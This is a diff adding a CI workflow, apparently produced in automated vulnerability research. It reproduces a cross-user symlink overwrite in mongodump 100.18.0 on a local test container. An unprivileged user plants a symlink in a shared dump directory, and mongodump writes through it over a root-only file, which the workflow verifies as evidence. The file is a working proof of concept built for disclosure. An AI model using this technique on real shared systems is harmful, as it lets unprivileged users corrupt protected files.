@@ -1,0 +1,181 @@
+name: MongoDB Agent 6 mongodump symlink overwrite
+
+on:
+  push:
+    branches:
+      - mongodb-agent6-mongodump-symlink-20260830
+
+permissions:
+  contents: read
+
+jobs:
+  mongodump-symlink-overwrite:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Download official Database Tools 100.18.0
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p evidence/runtime
+          cd evidence/runtime
+          url='https://fastdl.mongodb.org/tools/db/mongodb-database-tools-ubuntu2404-x86_64-100.18.0.tgz'
+          curl --retry 3 --retry-all-errors --fail --silent --show-error --location "$url" -o tools.tgz
+          sha256sum tools.tgz | tee official-tools-archive.sha256
+          tar -xzf tools.tgz
+          root="$(find . -maxdepth 1 -type d -name 'mongodb-database-tools-*100.18.0' -print -quit)"
+          test -n "$root"
+          printf '%s\n' "$root" > binary-root.txt
+          "$root/bin/mongodump" --version | tee mongodump-version.txt
+          "$root/bin/bsondump" --version | tee bsondump-version.txt
+
+      - name: Start local MongoDB and seed canary data
+        shell: bash
+        run: |
+          set -euo pipefail
+          docker pull mongo:8.0
+          image_id="$(docker image inspect mongo:8.0 --format '{{.Id}}')"
+          printf '%s\n' "$image_id" | tee evidence/runtime/mongo-server-image-id.txt
+          docker run --rm -d --name agent6-mongo -p 127.0.0.1:27017:27017 mongo:8.0 --bind_ip_all
+          for i in $(seq 1 60); do
+            if docker exec agent6-mongo mongosh --quiet --eval 'db.runCommand({ping:1}).ok' | grep -q '^1$'; then
+              break
+            fi
+            sleep 1
+          done
+          docker exec agent6-mongo mongosh --quiet --eval '
+            db = db.getSiblingDB("agent6");
+            db.probe.drop();
+            db.probe.insertOne({_id: 1, marker: "MONGODUMP_BSON_CANARY_6F19"});
+            printjson(db.probe.findOne({_id:1}));
+          ' | tee evidence/runtime/seed-document.txt
+
+      - name: Reproduce cross-user symlink overwrite
+        shell: bash
+        run: |
+          set -euo pipefail
+          cd evidence/runtime
+          root="$(cat binary-root.txt)"
+
+          shared='/tmp/agent6-shared'
+          out="$shared/out"
+          dbdir="$out/agent6"
+          protected='/tmp/agent6-protected'
+          target="$protected/root-only-target.bson"
+          control="$protected/root-only-control.txt"
+
+          sudo rm -rf "$shared" "$protected"
+          sudo mkdir -p "$shared" "$protected"
+          sudo chmod 0777 "$shared"
+          sudo sh -c "printf 'ROOT_ONLY_ORIGINAL_TARGET\n' > '$target'"
+          sudo sh -c "printf 'ROOT_ONLY_CONTROL_UNCHANGED\n' > '$control'"
+          sudo chmod 0600 "$target" "$control"
+          sudo chown root:root "$target" "$control"
+
+          {
+            echo '=== BEFORE ==='
+            stat -Lc 'target type=%F mode=%a owner=%U:%G size=%s path=%n' "$target"
+            stat -Lc 'control type=%F mode=%a owner=%U:%G size=%s path=%n' "$control"
+            sha256sum "$target" "$control"
+          } | tee before.txt
+
+          set +e
+          sudo -u nobody sh -c "printf 'ATTACKER_DIRECT_WRITE\n' > '$target'" 2>direct-write-denied.stderr
+          direct_rc=$?
+          set -e
+          printf 'direct_write_exit=%s\n' "$direct_rc" | tee direct-write-result.txt
+          test "$direct_rc" -ne 0
+          grep -E 'Permission denied|Operation not permitted' direct-write-denied.stderr >/dev/null
+
+          sudo -u nobody mkdir -p "$dbdir"
+          sudo -u nobody ln -s "$target" "$dbdir/probe.bson"
+
+          {
+            echo '=== ATTACKER-CONTROLLED OUTPUT TREE ==='
+            ls -ld "$shared" "$out" "$dbdir"
+            ls -l "$dbdir/probe.bson"
+            printf 'symlink_target=%s\n' "$(readlink "$dbdir/probe.bson")"
+          } | tee attacker-tree.txt
+
+          set +e
+          strace -f -o strace.txt -e trace=openat,open,creat,unlink,unlinkat,rename,renameat,renameat2 \
+            "$root/bin/mongodump" \
+              --host=127.0.0.1:27017 \
+              --db=agent6 \
+              --collection=probe \
+              --out="$out" \
+              >mongodump.stdout 2>mongodump.stderr
+          dump_rc=$?
+          set -e
+          printf 'mongodump_exit=%s\n' "$dump_rc" | tee mongodump-exit.txt
+          test "$dump_rc" -eq 0
+
+          {
+            echo '=== AFTER ==='
+            stat -Lc 'target type=%F mode=%a owner=%U:%G size=%s path=%n' "$target"
+            stat -Lc 'control type=%F mode=%a owner=%U:%G size=%s path=%n' "$control"
+            sha256sum "$target" "$control"
+            echo
+            echo '=== BSON TARGET DECODE ==='
+            "$root/bin/bsondump" "$target"
+            echo
+            echo '=== SYMLINK STILL PRESENT ==='
+            test -L "$dbdir/probe.bson"
+            ls -l "$dbdir/probe.bson"
+            readlink "$dbdir/probe.bson"
+            echo
+            echo '=== OPEN SYSCALLS INVOLVING probe.bson ==='
+            grep -F 'probe.bson' strace.txt || true
+          } | tee after.txt
+
+          grep -F 'MONGODUMP_BSON_CANARY_6F19' after.txt >/dev/null
+          grep -F 'ROOT_ONLY_CONTROL_UNCHANGED' "$control" >/dev/null
+
+          before_target="$(grep 'root-only-target.bson' before.txt | tail -1 | awk '{print $1}')"
+          after_target="$(grep 'root-only-target.bson' after.txt | grep -E '^[0-9a-f]{64} ' | tail -1 | awk '{print $1}')"
+          test -n "$before_target" -a -n "$after_target"
+          test "$before_target" != "$after_target"
+
+          cat > results.txt <<EOF
+          OFFICIAL_TOOLS_VERSION=100.18.0
+          DIRECT_WRITE_BY_NOBODY_DENIED=yes
+          ATTACKER_CREATED_SYMLINK_INSIDE_DUMP_ROOT=yes
+          MONGODUMP_EXIT_ZERO=yes
+          ROOT_ONLY_TARGET_OUTSIDE_DUMP_ROOT_CHANGED=yes
+          TARGET_NOW_CONTAINS_DUMPED_BSON_CANARY=yes
+          UNRELATED_ROOT_ONLY_CONTROL_FILE_UNCHANGED=yes
+          SYMLINK_REMAINED_PRESENT_AFTER_DUMP=yes
+          VERDICT=CONFIRMED
+          EOF
+          cat results.txt
+
+      - name: Cleanup local MongoDB
+        if: always()
+        shell: bash
+        run: docker rm -f agent6-mongo >/dev/null 2>&1 || true
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: mongodb-agent6-mongodump-symlink-overwrite-100.18.0
+          path: |
+            evidence/runtime/results.txt
+            evidence/runtime/before.txt
+            evidence/runtime/after.txt
+            evidence/runtime/attacker-tree.txt
+            evidence/runtime/direct-write-result.txt
+            evidence/runtime/direct-write-denied.stderr
+            evidence/runtime/mongodump.stdout
+            evidence/runtime/mongodump.stderr
+            evidence/runtime/mongodump-exit.txt
+            evidence/runtime/strace.txt
+            evidence/runtime/mongodump-version.txt
+            evidence/runtime/bsondump-version.txt
+            evidence/runtime/official-tools-archive.sha256
+            evidence/runtime/mongo-server-image-id.txt
+            evidence/runtime/seed-document.txt
+          if-no-files-found: warn
+          retention-days: 7
